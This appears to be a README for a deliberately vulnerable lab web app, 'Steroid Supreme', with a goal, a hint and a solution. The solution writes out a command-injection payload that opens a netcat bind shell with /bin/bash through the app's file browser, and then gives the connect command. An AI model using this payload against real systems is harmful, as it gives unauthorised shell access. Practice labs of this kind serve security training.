# Steroid-Supreme


## About

Steroid Supreme is a vulnerable web app based on bash-injection.

## Goal

Your goal is to get shell access on the machine running steroid-supreme.


## Hints

Can you get the file browser to break?


## Solution:

Enter the following in the file browser:
```bash
; nc -lvp 5001 -e /bin/bash
```

Run the following in a terminal:
```bash
nc <ip of steroid supreme> 5001
```
